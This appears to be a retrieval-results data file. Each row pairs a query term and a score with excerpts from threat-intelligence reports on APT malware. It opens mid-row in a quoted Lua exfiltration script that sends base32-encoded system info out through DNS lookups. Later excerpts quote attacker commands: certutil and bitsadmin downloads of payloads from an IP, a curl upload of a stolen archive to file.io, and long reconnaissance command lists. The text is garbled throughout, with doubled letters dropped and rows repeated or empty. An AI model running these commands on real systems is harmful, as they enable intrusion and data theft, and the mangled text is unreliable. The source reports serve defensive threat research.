endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
6a9eef4ab96be12f22fb4868b49e0cf9,Delete file,0.7717716343755252,"['5 Creates a file to write to, deleting it if it already exists.', 'Combined with E comand to download a file to the system.', 'E Writes data from C2 to a file opened using the 5 comand.', 'Combined with 5 comand to download a file to the system.', '6 Reads a file, which efectively uploads the file to the C2.', '7 Delete a specified file.', '8 Execute a comand using WinExec.', 'Responds to C2 with s if sucesful or r if unsucesful.', '9 Timestomps.', 'Sets a specified files timestamps to match that of a system file in the System32 directory.', 'Table 5: Comand handler in Psylo that difers dramaticaly from FakeM Another discovery we made while researching this blog is an overlap betwen Psylo infrastructure and a Trojan focused on compromising Android mobile devices.']"
6a9eef4ab96be12f22fb4868b49e0cf9,Delete file,0.7717716343755252,"['5 Creates a file to write to, deleting it if it already exists.', 'Combined with E comand to download a file to the system.', 'E Writes data from C2 to a file opened using the 5 comand.', 'Combined with 5 comand to download a file to the system.', '6 Reads a file, which efectively uploads the file to the C2.', '7 Delete a specified file.', '8 Execute a comand using WinExec.', 'Responds to C2 with s if sucesful or r if unsucesful.', '9 Timestomps.', 'Sets a specified files timestamps to match that of a system file in the System32 directory.', 'Table 5: Comand handler in Psylo that difers dramaticaly from FakeM Another discovery we made while researching this blog is an overlap betwen Psylo infrastructure and a Trojan focused on compromising Android mobile devices.']"
7d92f97b145ba4828809a1d8754bdfde,It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence.,0.947147720581485,"['Figure 14.', 'Code similarities in CPAS and ucmMsStoreProtocolMethod It works in a similar way to ABPAS.', 'However, unlike ABPAS, it hijacks the ms-windows-store protocol.', 'The hack tol CPAS works as folows: 1.', 'It disables the aplication asociation toasts for the protocol ms-windows-store.', '2.', 'It creates a new Shel in the registry.', '3.', 'It invokes the undocumented API UserAsocSet to update the file asociation.', '4.', 'It executes WSReset.exe to triger this protocol.']"
7d92f97b145ba4828809a1d8754bdfde,"malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.",0.8727055969116467,"['<omited> .', '[*] File or folder aces denied!', '[*] File or folder aces denied!', '[+] Al completed!', 'The file with a .z extension is a blob of exfiltrated data within a self-defined file format.', 'The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.', 'After, it stores the encrypted key blob into the first 0x80 bytes of the file with the .z extension.', 'Starting from the ofset 0x80, there exists a long aray of al the exfiltrated data.', '24/42 Much of the information from the exfiltrated files are saved, such as the MD5 hash, the length of the file name, the compresed file size, the original file size, the file name, and the files content.', 'To separate the file blobs, it puts a unique byte sequence at the end of each, 5 5 5 5 A A A A F F F F 9 9 9 9.', 'Figure 34.']"
7d92f97b145ba4828809a1d8754bdfde,that had the remote desktop service enabled.,0.9217642324718502,"['For example, we found a specific name TaoZongjie among the diferent malware samples we colected.', 'In adition, the GitHub repository named YanNaingOo07202, mentioned in Avasts December 202 report, hosted multiple pieces of malware, including TONESHEL.', 'We also observed that the obfuscation methods have similarities among the diferent malwares.', 'User TaoZongjie We found some samples sharing the same special string/name TaoZongjie, including the Cobalt Strike malware, a Windows user on a TONESHEL C&C server, and the displayed mesage in the pop-up dialog box of TONESHEL.', 'Our investigation started with the TONESHEL C&C server 38[.]54[.]3[.', ']28 that had the remote desktop service enabled.', 'Here, we found that one of the Windows users was caled TaoZongjie.', '34/42 Figure 48.', 'Windows users in 38[.]54[.]3[.', ']28 While hunting samples related to this campaign, we came acros a twet about Cobalt Strike posted in April 2021.', 'At first glance, Cobalt Strike was used in a maner similar to this campaign, including the use of DL sideloading, the use of a Gogle Drive link for delivery, and the creation of a schedule task.']"
cae33c8970a53857dff6608fe8894b8a,Persistence via Scheduled Task,0.7586072908571941,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
38cf6fef9636460c8e7bc58f28e3bba1,Persistence via Scheduled Task,0.763636854772601,"['Figure 7 shows one of the string decryption functions which uses such an obfuscation technique.', 'Figure 7: Control flow flatening using switch-case obfuscation The sequence of steps of decryption are shufled using switch-case and the order is folowed acording to the folowing sequence: ""15|12|3|2|14|5|1|10|9|17|8|7|6|4|13|16|0|1"" 7/2 It means, ""case 15"" is executed folowed by ""case 12"" and so on.', 'The final case 1 returns the decrypted string.', 'We can re-write the string decryption function as shown in Figure 8 which is easier to analyze.', 'Figure 8: re-writen string decryption function We have included a list of interesting decrypted strings extracted from the JavaScript in Apendix I.', '[+] Persistence The threat actor achieves persistence via Scheduled task.', 'During JavaScript execution, a scheduled task with the name ""UpdateModel Task\' wil be created to execute the droped loader binary with required comand line arguments.', 'Task details: <Exec> <Comand> %apdata%\\Microsoft\\FontCache\\CloudFonts\\SerenadeDACplAp.exe </Comand> <Arguments> ""OUM3NjBDNjAtRkNDQi0Q0FDLUE5NEMtNzY0RTc5MDNDN0Mw"" ""devZUQVD.tmp"" ""NzkzMTA3"" ""Ni4xLjc2MDE%3D"" 0 ""E4A6450B"" ""NTk1NDQxWwpaWhlhdmVbB1tf"" Z </Arguments> 8/2 <WorkingDirectory> %apdata%\\Microsoft\\FontCache\\CloudFonts </WorkingDirectory> </Exec> Stage 4: Droped binary (Loader) As described in previous section, the JavaScript drops two files: a) An executable file (SerenadeDACplAp.exe) - It turns out to be a loader b) A binary file (devZUQVD.tmp) - This is the file loaded during runtime by the loader The loader is executed by the scheduled task along with the required arguments.', 'During the course of its execution it performs folowing operations: 1.', 'Performs comand-line checks and extracts the file name for the binary to be loaded The loader checks if the comand-line ends with ("").', 'If true then it wil terminate the proces else it wil parse the arguments to extract the file name for the binary file to be loaded.']"
920bbf3f4cf30cf9c556531074485448,download a malicious file,0.834669304408771,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
48b39fd3765500b6f8882ea668da876b,decoding,0.8392441767356461,"['A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT Operation Grand Mars: Defending Against Carbanak Cyber Atacks Operation Grand Mars: Defending Against Carbanak Cyber Atacks Author Thanasis Diogos EMEA Managing Consultant, Incident Response, Trustwave Contributors Sachin Deodhar EMEA Incident Response Consultant, Trustwave Rodel Mendrez Security Researcher, Trustwave Table of Contents Executive Sumary .', '.', '.', '.', '.', '.', '.']"
9f37e71695d9bbc0a254d54d1edbdb58,string-decryption code,0.8917239067009792,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
9f37e71695d9bbc0a254d54d1edbdb58,string-decryption code,0.8917239067009792,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
920bbf3f4cf30cf9c556531074485448,cmd.exe /C,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe /C,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /C,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /C,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe /C,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe /C,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /C,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
485f54b00d26addc7791223cdf8f1ba8,bat script:,1.0,"['4 GUID is a unique reference number.', 'Its a 128-bit value that is unique not only within an enterprise but also worldwide.', 'Active Directory internaly uses GUID to identify objects.', '24 | The Spy Kitens Are Back: Rocket Kiten 2 The second line deletes the script in an atempt to hide the infection.', 'The file, NTUSER.dat{GUID}.exe (SHA-1: 64ba130e627d85c85d6534e769d239080e068d, detected by Trend Micro as BKDR_SWRORT.CP) has ben droped prior to launching the tmp.', 'bat script.', 'BKDR_SWRORT.CP is a smal downloader that comunicates with and downloads files from the IP adres, 84.1.146.62.', 'This IP adres belongs to an IABG IP range (htp:/w.iabg.de/), a German satelite comunications provider that the atackers have ben using for a long time.', '25 | The Spy Kitens Are Back: Rocket Kiten 2 Conclusion Conclusion The Rocket Kiten Group has ben around for a while now.', 'Based on research done by several security companies, including Trend Micro and ClearSky, we can asume that their activities wil continue in the near future, as they werent detered by making their existence and atack methods known.', 'Weve ben observing the group for about a year now.']"
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,[]
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,[]
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,"['.', '.', '.', '.', '.', '1 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,bat script:,0.7623953923231473,"['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']"
bd097ffaaa48344fda3e6704d76f4f4b,bat script:,0.7696038208350755,"['Static information of DL are shown below: Hash ca24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d329ade52ec8382c2 Threat Kimsuky second stage Brief DL used by the Kimsuky group as second stage Description Ssdep 614:6lhe64TNUalJMRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uL Table 2: AutoUpdate.dl Information The dl is then copied into the folder %ApData%\\Roaming\\Microsoft\\Windows\\Defender\\ and it is renamed into AutoUpdate.dl.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 2/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog The AutoUpdate.dl library then gains persistence by seting the folowing registry key HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\RunOnce\\WindowsDefender.', 'The name and the path used by the atacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %ApData%\\Local\\Temp path, we observed another temporary file created and imediately removed dubed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is posible to obtain the CV Form string.', 'The name and other information about the document are the folowing: Hash d21523b7b8f6584305a0a6a83cd65c8ce07a42ab781c35a06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert atention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahU:r3YkA+1aJuk dep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the folowing figure.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 3/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog Figure 6: Legit document overview Bypasing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dl in order to avoid AVs detection.', 'Diging in the malicious code, it is posible to se the methods used to perform this operation.']"
bd097ffaaa48344fda3e6704d76f4f4b,bat script:,0.7696038208350755,"['Static information of DL are shown below: Hash ca24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d329ade52ec8382c2 Threat Kimsuky second stage Brief DL used by the Kimsuky group as second stage Description Ssdep 614:6lhe64TNUalJMRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uL Table 2: AutoUpdate.dl Information The dl is then copied into the folder %ApData%\\Roaming\\Microsoft\\Windows\\Defender\\ and it is renamed into AutoUpdate.dl.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 2/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog The AutoUpdate.dl library then gains persistence by seting the folowing registry key HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\RunOnce\\WindowsDefender.', 'The name and the path used by the atacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %ApData%\\Local\\Temp path, we observed another temporary file created and imediately removed dubed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is posible to obtain the CV Form string.', 'The name and other information about the document are the folowing: Hash d21523b7b8f6584305a0a6a83cd65c8ce07a42ab781c35a06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert atention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahU:r3YkA+1aJuk dep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the folowing figure.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 3/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog Figure 6: Legit document overview Bypasing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dl in order to avoid AVs detection.', 'Diging in the malicious code, it is posible to se the methods used to perform this operation.']"
3e9312913ace03550c810e6b92ab1d61,tasklist,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,tasklist,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a 